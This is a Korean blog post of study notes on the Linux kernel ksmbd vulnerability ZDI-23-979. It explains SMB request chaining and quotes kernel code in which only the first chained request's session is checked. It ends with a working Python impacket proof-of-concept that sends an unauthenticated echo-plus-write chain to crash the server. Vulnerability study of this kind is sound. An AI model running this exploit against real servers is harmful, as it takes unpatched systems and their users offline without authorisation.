---
layout: post
title: "ksmbd - 1. ZDI-23-979"
categories:
  - Pwnable
tags:
  - pwn
  - kernel
last_modified_at: 2025-10-13
---

오늘 읽을 자료는 [https://pwning.tech/ksmbd/](https://pwning.tech/ksmbd/)
리눅스 커널의 ksmbd 부분에 대해 알아보자. 


# ZDI-22-1690 
리눅스 커널 ksmbd 하위 시스템에 존재하는 unauthentication RCE vul이다. ksmbd는 Kernel SMB Daemon의 약자로, 커널에서 SMB server 역할을 한다(Windows에서 많이 볼 수 있다. 시스템 보안 2주차에서도 나왔던듯)

SMB 관련한 취약점은 많은데 이게 커널에 도입 되었다. 해당 post에서는 ksmbd 시스템의 취약점을 조사할 예정이다. 

ZDI-23-979
ZDI-23-980 

# SMB 
SMB는 Server Message Block의 약자로, 윈도우에서 많이 쓰는 파일 전송 프로토콜이다. SMB에서 제공하는 기능은 다음과 같다. 

1. file Read, Write 
2. Directory info access 
3. authentication 

Windows OS에서는 SMB를 통합하기 위해 Windows에서 사용하는 다양한 인증 방식을 제공한다(NTLMSSP, kerberos 5, Microsoft Kerberos 5, U2U auth) 

여기서 RAM이나 disk 저장 공간에서 resource 낭비를 방지하기 위해 credit system을 사용한다. 각 명령이 세션에서 크레딧을 차감하는 시스템 
* 원문 살펴볼 필요가 있다. 

## SMB 프로토콜 

여러개의 명령을 하나의 네트워크 패킷에 담아 보냄 -> 컴파운딩/체이닝 기능 

# ZDI-23-979 : NULL pointer 역참조 DoS 

chained SMB request packet의 session 처리 과정에서 발생하는 logical bug -> NULL pointer 역참조 취약점이 발생한다. 

1. 패킷의 첫번째 요청에 대한 세션 처리 
2. 패킷의 두번째 요청도 동일한 세션 인스턴스 사용 

if 첫번째 요청에서 세션을 사용하지 않으면, 
-> 두번째 요청도 세션을 사용하지 않음 

이때 세션 auth 검사를 건너뛸 수 있어서 인증 우회가 발생할 수 있다. 그런데 post에서는 인증 우회에 대해 언급하진 않고 인증을 처리하기 위해 요청 세션의 속성에 접근 -> 근데 세션을 사용하지 않은 요청에 한해 NULL 포인터를 역참조하게 된다. 

__handle_ksmbd_work 함수
모든 패킷을 연결할 때마다 해당 함수가 호출됨 

```c
static void __handle_ksmbd_work(struct ksmbd_work *work,
				struct ksmbd_conn *conn)
{
	u16 command = 0;
	int rc;

	// [snip] (initialize buffers) 

	if (conn->ops->check_user_session) {
		rc = conn->ops->check_user_session(work);

		// if rc != 0 goto send (auth failed)
		if (rc < 0) {
			command = conn->ops->get_cmd_val(work);
			conn->ops->set_rsp_status(work,
					STATUS_USER_SESSION_DELETED);
			goto send;
		} else if (rc > 0) {
			rc = conn->ops->get_ksmbd_tcon(work);
			if (rc < 0) {
				conn->ops->set_rsp_status(work,
					STATUS_NETWORK_NAME_DELETED);
				goto send;
			}
		}
	}

	do {
		rc = __process_request(work, conn, &command);
		if (rc == SERVER_HANDLER_ABORT)
			break;

	    // [snip] (set SMB credits)
	} while (is_chained_smb2_message(work));

	if (work->send_no_response)
		return;

send:
	// [snip] (send response)
}
```

위 코드를 살펴보면 if (conn->ops->check_user_session) 으로 첫번째 요청에 대한 user_session만 확인한다. 

세션 확인은 1번 
실제 명령 처리는 여러 번 

아 연결과 process_request와는 달라서 

1. if (conn -> ops -> check_user_session)
2. __process_request 호출 -> SMB 명령은 여기서 처리 

```c
if (conn->ops->check_user_session) {
		rc = conn->ops->check_user_session(work);

		// if rc != 0 goto send (auth failed)
		if (rc < 0) {
			command = conn->ops->get_cmd_val(work);
			conn->ops->set_rsp_status(work,
					STATUS_USER_SESSION_DELETED);
			goto send;
		} else if (rc > 0) {
			rc = conn->ops->get_ksmbd_tcon(work);
			if (rc < 0) {
				conn->ops->set_rsp_status(work,
					STATUS_NETWORK_NAME_DELETED);
				goto send;
			}
		}
```

conn->ops->check_user_session(work)req_hdr->SessionIdreq_hdr->SessionIdwork->sess = ksmbd_session_lookup_all(conn, sess_id)work->sess = NULL

```
int smb2_check_user_session(struct ksmbd_work *work)
{
	struct smb2_hdr *req_hdr = smb2_get_msg(work->request_buf);
	struct ksmbd_conn *conn = work->conn;
	unsigned int cmd = conn->ops->get_cmd_val(work);
	unsigned long long sess_id;

	/*
	 * SMB2_ECHO, SMB2_NEGOTIATE, SMB2_SESSION_SETUP command do not
	 * require a session id, so no need to validate user session's for
	 * these commands.
	 */
	if (cmd == SMB2_ECHO_HE || cmd == SMB2_NEGOTIATE_HE ||
	    cmd == SMB2_SESSION_SETUP_HE)
		return 0;

	// [snip] (check conn quality)

	sess_id = le64_to_cpu(req_hdr->SessionId);

	// [snip] (chained request logic that was unused)

	/* Check for validity of user session */
	work->sess = ksmbd_session_lookup_all(conn, sess_id);
	if (work->sess)
		return 1;
	
    // [snip] (invalid session handling)
}
```

만약 첫번째 명령이 SMB2_ECHO_HE 이고 두번째 명령은 SMB2_WRITE라면, work->sess는 smb2_write()에서 NULL이 될 것이다. 

이걸 역참조하게 되니까 -> 강제 종료 일어남 


```
#!/usr/bin/env python3

from impacket import smb3, nmb
from pwn import p64, p32, p16, p8


def main():
    print("[*] connecting to SMB server (no login)...")

    try:
        conn = smb3.SMB3("127.0.0.1", "127.0.0.1", sess_port=445, timeout=3)
    except nmb.NetBIOSTimeout:
        print("[!] SMB server is already offline (connection timeout)")
        return

    # generate innocent SMB_ECHO request
    request_echo = smb3.SMB3Packet()
    request_echo['Command'] = smb3.SMB2_ECHO
    request_echo["Data"] = p16(4) + p16(0)
    request_echo["NextCommand"] = 64+4  # set NextCommand to indicate request chaining

    # generate innocent SMB_WRITE request
    request_write = smb3.SMB3Packet()
    request_write['Command'] = smb3.SMB2_WRITE
    request_write["Data"] = p16(49) + p16(0) + p32(0) + p64(0) + p64(0) + p64(0) + p32(0) + p32(0) + p16(0) + p16(0) + p32(0) + p8(0)
    request_write["TreeID"] = 0

    # chain SMB_WRITE to SMB_ECHO
    request_echo["Data"] += request_write.getData()

    print('[*] sending DoS packet...')
    conn.sendSMB(request_echo)

    print("[*] probing server health...")

    try:
        smb3.SMB3("127.0.0.1", "127.0.0.1", sess_port=445, timeout=3)
        print("[!] exploit failed - server remains online")
    except nmb.NetBIOSTimeout:
        print("[+] exploit succeeded - server is now offline")


if __name__ == "__main__":
    main()
```


